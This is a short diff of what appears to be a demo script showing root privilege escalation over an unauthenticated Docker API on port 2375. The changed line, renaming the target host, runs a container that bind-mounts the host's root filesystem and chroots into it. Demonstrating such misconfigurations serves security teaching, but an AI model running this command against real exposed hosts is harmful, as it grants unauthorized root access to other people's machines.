@@ -37,6 +37,6 @@ printf "\n"
 
 info "And now, let's show a full privesc, from a different host since the API is exposed on every port"
 info "We bind-mount the host's root filesystem into the container and chroot into it"
-command "DOCKER_HOST=ubuntu1804:2375 docker run --rm -it -v /:/host alpine chroot /host"
+command "DOCKER_HOST=ubuntu:2375 docker run --rm -it -v /:/host alpine chroot /host"
 
 stop_demo
